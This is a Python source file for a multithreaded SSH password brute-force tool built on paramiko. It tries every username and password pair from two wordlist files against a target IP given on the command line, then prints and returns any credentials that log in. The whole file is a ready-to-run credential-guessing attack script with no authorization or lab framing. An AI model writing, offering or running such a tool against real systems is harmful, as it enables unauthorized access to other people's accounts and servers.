import paramiko
import socket
import sys
import threading
from queue import Queue

def ssh_attempt(host, port, username, password, timeout, result_queue):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        print(f"Trying {username}:{password}")
        client.connect(host, port=port, username=username, password=password, timeout=timeout, banner_timeout=timeout)
        print(f"\n[+] SUCCESS: Username: {username} | Password: {password}")
        result_queue.put((username, password))
    except paramiko.AuthenticationException:
        pass
    except (socket.timeout, paramiko.SSHException):
        print("[!] Connection timed out or blocked")
    finally:
        client.close()

def ssh_bruteforce(host, port, usernames, passwords, timeout=3, max_threads=10):
    result_queue = Queue()
    threads = []
    for username in usernames:
        for password in passwords:
            t = threading.Thread(target=ssh_attempt, args=(host, port, username.strip(), password.strip(), timeout, result_queue))
            threads.append(t)
            t.start()
            # Limit the number of concurrent threads
            while threading.active_count() > max_threads:
                pass

    for t in threads:
        t.join()

    if not result_queue.empty():
        username, password = result_queue.get()
        print(f"\n[+] Found valid credentials: {username}:{password}")
        return username, password
    else:
        print("\n[-] Failed to find valid credentials.")
        return None, None

def read_wordlist(file_path):
    try:
        with open(file_path, 'r') as file:
            return [line.strip() for line in file if line.strip()]
    except FileNotFoundError:
        print(f"[!] File not found: {file_path}")
        return []

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python3 {sys.argv[0]} <target_ip>")
        sys.exit(1)

    target_ip = sys.argv[1]
    target_port = 22

    username_file = "usernames.txt"
    password_file = "passwords.txt"

    username_list = read_wordlist(username_file)
    password_list = read_wordlist(password_file)

    ssh_bruteforce(target_ip, target_port, username_list, password_list)
